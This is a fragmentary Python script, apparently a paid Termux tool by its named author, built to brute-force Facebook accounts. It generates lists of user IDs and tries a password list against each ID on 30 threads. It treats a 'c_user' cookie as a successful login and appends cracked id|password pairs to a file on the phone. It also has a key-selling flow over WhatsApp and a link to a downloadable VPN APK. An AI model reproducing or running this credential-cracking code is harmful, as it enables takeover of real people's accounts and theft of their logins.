...
os.system('xdg-open https://www.facebook.com/maruf.sardar.7146')
...
```

 Auther     Md.MARUF Sardar
 Github      MARUF King
 Facebook  Prince MARUF
 Contack   Facebook
 Gmail         gamingmaruf572@gmail.com
 Status        Paid Tool

   Ami tor bap kota ta mona rakis My name is Maruf

 MARUF Pro version 1.9.8
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/MARUF_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi MARUF Sir, I Need To Buy Your Paid MARUF PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python MARUF.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as MARUF:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                MARUF.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MARUF-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        MARUF=session.cookies.get_dict().keys()
                        if "c_user" in MARUF:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [MARUF-OK] %s | %s'%(ids,pas))
                                open('/sdcard/MARUF-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in MARUF:
                                if 'y' in pcp:
